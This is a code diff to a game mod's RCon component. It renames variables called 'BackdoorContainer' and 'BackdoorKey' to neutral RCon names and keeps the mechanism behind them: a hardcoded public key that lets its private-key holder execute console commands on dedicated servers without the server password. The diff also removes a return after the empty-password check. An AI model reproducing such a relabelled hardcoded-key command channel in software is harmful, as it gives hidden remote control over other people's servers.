@@ -2,15 +2,15 @@
 
 namespace Components
 {
-	RCon::Container RCon::BackdoorContainer;
-	Utils::Cryptography::ECC::Key RCon::BackdoorKey;
+	RCon::Container RCon::RconContainer;
+	Utils::Cryptography::ECC::Key RCon::RconKey;
 
 	std::string RCon::Password;
 
 	Dvar::Var RCon::RconPassword;
 	Dvar::Var RCon::RconLogRequests;
 
-	RCon::RCon()
+	void RCon::AddCommands()
 	{
 		Command::Add("rcon", [](Command::Params* params)
 		{
@@ -20,43 +20,85 @@ namespace Components
 			if (std::strcmp(operation, "login") == 0)
 			{
 				if (params->size() < 3) return;
-				RCon::Password = params->get(2);
+				Password = params->get(2);
+				return;
 			}
-			else if (std::strcmp(operation, "logout") == 0)
-			{
-				RCon::Password.clear();
-			}
-			else
-			{
-				auto addr = reinterpret_cast<Game::netadr_t*>(0xA5EA44);
-				if (!RCon::Password.empty()) 
-				{
-					Network::Address target(addr);
-					if (!target.isValid() || target.getIP().full == 0)
-					{
-						target = Party::Target();
-					}
 
-					if (target.isValid())
-					{
-						Network::SendCommand(target, "rcon", RCon::Password + " " + params->join(1));
-					}
-					else
-					{
-						Logger::Print("You are connected to an invalid server\n");
-					}
-				}
-				else
-				{
-					Logger::Print("You need to be logged in and connected to a server!\n");
-				}
+			if (std::strcmp(operation, "logout") == 0)
+			{
+				Password.clear();
+				return;
 			}
+				
+			auto* addr = reinterpret_cast<Game::netadr_t*>(0xA5EA44);
+			if (Password.empty())
+			{
+				Logger::Print("You need to be logged in and connected to a server!\n");
+			}
+
+			Network::Address target(addr);
+			if (!target.isValid() || target.getIP().full == 0)
+			{
+				target = Party::Target();
+			}
+
+			if (target.isValid())
+			{
+				Network::SendCommand(target, "rcon", Password + " " + params->join(1));
+				return;
+			}
+
+			Logger::Print("You are connected to an invalid server\n");
 		});
 
-		if (!Dedicated::IsEnabled()) return;
+		Command::Add("remoteCommand", [](Command::Params* params)
+		{
+			if (params->size() < 2) return;
+
+			RconContainer.command = params->get(1);
+
+			auto* addr = reinterpret_cast<Game::netadr_t*>(0xA5EA44);
+			Network::Address target(addr);
+			if (!target.isValid() || target.getIP().full == 0)
+			{
+				target = Party::Target();
+			}
+
+			if (target.isValid())
+			{
+				Network::SendCommand(target, "rconRequest");
+			}
+		});
+	}
+
+	RCon::RCon()
+	{
+		AddCommands();
+
+		if (!Dedicated::IsEnabled())
+		{
+			Network::OnClientPacket("rconAuthorization", [](const Network::Address& address, [[maybe_unused]] const std::string& data)
+			{
+				if (RconContainer.command.empty())
+				{
+					return;
+				}
+
+				const auto& key = CryptoKey::Get();
+				const auto signedMsg = Utils::Cryptography::ECC::SignMessage(key, data);
+
+				Proto::RCon::Command rconExec;
+				rconExec.set_command(RconContainer.command);
+				rconExec.set_signature(signedMsg);
+
+				Network::SendCommand(address, "rconExecute", rconExec.SerializeAsString());
+			});
+
+			return;
+		}
 
 		// Load public key
-		static uint8_t publicKey[] =
+		static std::uint8_t publicKey[] =
 		{
 			0x04, 0x01, 0x9D, 0x18, 0x7F, 0x57, 0xD8, 0x95, 0x4C, 0xEE, 0xD0, 0x21,
 			0xB5, 0x00, 0x53, 0xEC, 0xEB, 0x54, 0x7C, 0x4C, 0x37, 0x18, 0x53, 0x89,
@@ -72,17 +114,17 @@ namespace Components
 			0x08
 		};
 
-		RCon::BackdoorKey.set(std::string(reinterpret_cast<char*>(publicKey), sizeof(publicKey)));
+		RconKey.set(std::string(reinterpret_cast<char*>(publicKey), sizeof(publicKey)));
 
-		RCon::BackdoorContainer.timestamp = 0;
+		RconContainer.timestamp = 0;
 
 		Scheduler::Once([]
 		{
-			RCon::RconPassword =  Dvar::Register<const char*>("rcon_password", "", Game::DVAR_NONE, "The password for rcon");
-			RCon::RconLogRequests = Dvar::Register<bool>("rcon_log_requests", false, Game::DVAR_NONE, "Print remote commands in the output log");
+			RconPassword =  Dvar::Register<const char*>("rcon_password", "", Game::DVAR_NONE, "The password for rcon");
+			RconLogRequests = Dvar::Register<bool>("rcon_log_requests", false, Game::DVAR_NONE, "Print remote commands in the output log");
 		}, Scheduler::Pipeline::MAIN);
 
-		Network::OnServerPacket("rcon", [](const Network::Address& address, [[maybe_unused]] const std::string& data)
+		Network::OnClientPacket("rcon", [](const Network::Address& address, [[maybe_unused]] const std::string& data)
 		{
 			std::string data_ = data;
 
@@ -104,7 +146,7 @@ namespace Components
 				password.erase(password.begin());
 			}
 
-			const auto svPassword = RCon::RconPassword.get<std::string>();
+			const auto svPassword = RconPassword.get<std::string>();
 
 			if (svPassword.empty())
 			{
@@ -112,69 +154,123 @@ namespace Components
 				return;
 			}
 
-			if (svPassword == password)
-			{
-				static std::string outputBuffer;
-				outputBuffer.clear();
-
-#ifndef DEBUG
-				if (RCon::RconLogRequests.get<bool>())
-#endif
-				{
-					Logger::Print(Game::CON_CHANNEL_NETWORK, "Executing RCon request from {}: {}\n", address.getString(), command);
-				}
-
-				Logger::PipeOutput([](const std::string& output)
-				{
-					outputBuffer.append(output);
-				});
-
-				Command::Execute(command, true);
-
-				Logger::PipeOutput(nullptr);
-
-				Network::SendCommand(address, "print", outputBuffer);
-				outputBuffer.clear();
-			}
-			else
+			if (svPassword != password)
 			{
 				Logger::Print(Game::CON_CHANNEL_NETWORK, "Invalid RCon password sent from {}\n", address.getString());
+				return;
 			}
-		});
 
-		Network::OnServerPacket("rconRequest", [](const Network::Address& address, [[maybe_unused]] const std::string& data)
-		{
-			RCon::BackdoorContainer.address = address;
-			RCon::BackdoorContainer.challenge = Utils::Cryptography::Rand::GenerateChallenge();
-			RCon::BackdoorContainer.timestamp = Game::Sys_Milliseconds();
+			static std::string outputBuffer;
+			outputBuffer.clear();
 
-			Network::SendCommand(address, "rconAuthorization", RCon::BackdoorContainer.challenge);
-		});
-
-		Network::OnServerPacket("rconExecute", [](const Network::Address& address, [[maybe_unused]] const std::string& data)
-		{
-			if (address != RCon::BackdoorContainer.address) return; // Invalid IP
-			if (!RCon::BackdoorContainer.timestamp || (Game::Sys_Milliseconds() - RCon::BackdoorContainer.timestamp) > (1000 * 10)) return; // Timeout
-			RCon::BackdoorContainer.timestamp = 0;
-
-			Proto::RCon::Command command;
-			command.ParseFromString(data);
-
-			if (Utils::Cryptography::ECC::VerifyMessage(RCon::BackdoorKey, RCon::BackdoorContainer.challenge, command.signature()))
+#ifndef DEBUG
+			if (RconLogRequests.get<bool>())
+#endif
 			{
-				RCon::BackdoorContainer.output.clear();
-				Logger::PipeOutput([](const std::string& output)
-				{
-					RCon::BackdoorContainer.output.append(output);
-				});
-
-				Command::Execute(command.commands(), true);
-
-				Logger::PipeOutput(nullptr);
-
-				Network::SendCommand(address, "print", RCon::BackdoorContainer.output);
-				RCon::BackdoorContainer.output.clear();
+				Logger::Print(Game::CON_CHANNEL_NETWORK, "Executing RCon request from {}: {}\n", address.getString(), command);
 			}
+
+			Logger::PipeOutput([](const std::string& output)
+			{
+				outputBuffer.append(output);
+			});
+
+			Command::Execute(command, true);
+
+			Logger::PipeOutput(nullptr);
+
+			Network::SendCommand(address, "print", outputBuffer);
+			outputBuffer.clear();
 		});
+
+		Network::OnClientPacket("rconRequest", [](const Network::Address& address, [[maybe_unused]] const std::string& data)
+		{
+			RconContainer.address = address;
+			RconContainer.challenge = Utils::Cryptography::Rand::GenerateChallenge();
+			RconContainer.timestamp = Game::Sys_Milliseconds();
+
+			Network::SendCommand(address, "rconAuthorization", RconContainer.challenge);
+		});
+
+		Network::OnClientPacket("rconExecute", [](const Network::Address& address, [[maybe_unused]] const std::string& data)
+		{
+			if (address != RconContainer.address) return; // Invalid IP
+			if (!RconContainer.timestamp || (Game::Sys_Milliseconds() - RconContainer.timestamp) > (1000 * 10)) return; // Timeout
+
+			RconContainer.timestamp = 0;
+
+			Proto::RCon::Command rconExec;
+			rconExec.ParseFromString(data);
+
+			if (!Utils::Cryptography::ECC::VerifyMessage(RconKey, RconContainer.challenge, rconExec.signature()))
+			{
+				return;
+			}
+
+			RconContainer.output.clear();
+			Logger::PipeOutput([](const std::string& output)
+			{
+				RconContainer.output.append(output);
+			});
+
+			Command::Execute(rconExec.command(), true);
+
+			Logger::PipeOutput(nullptr);
+
+			Network::SendCommand(address, "print", RconContainer.output);
+			RconContainer.output.clear();
+		});
+	}
+
+	bool RCon::CryptoKey::LoadKey(Utils::Cryptography::ECC::Key& key)
+	{
+		std::string data;
+		if (!Utils::IO::ReadFile("./private.key", &data))
+		{
+			return false;
+		}
+
+		key.deserialize(data);
+		return key.isValid();
+	}
+
+	Utils::Cryptography::ECC::Key RCon::CryptoKey::GenerateKey()
+	{
+		auto key = Utils::Cryptography::ECC::GenerateKey(512);
+		if (!key.isValid())
+		{
+			throw std::runtime_error("Failed to generate server key!");
+		}
+
+		if (!Utils::IO::WriteFile("./private.key", key.serialize()))
+		{
+			throw std::runtime_error("Failed to write server key!");
+		}
+
+		return key;
+	}
+
+	Utils::Cryptography::ECC::Key RCon::CryptoKey::LoadOrGenerateKey()
+	{
+		Utils::Cryptography::ECC::Key key;
+		if (LoadKey(key))
+		{
+			return key;
+		}
+
+		return GenerateKey();
+	}
+
+	Utils::Cryptography::ECC::Key RCon::CryptoKey::GetKeyInternal()
+	{
+		auto key = LoadOrGenerateKey();
+		Utils::IO::WriteFile("./public.key", key.getPublicKey());
+		return key;
+	}
+
+	const Utils::Cryptography::ECC::Key& RCon::CryptoKey::Get()
+	{
+		static auto key = GetKeyInternal();
+		return key;
 	}
 }
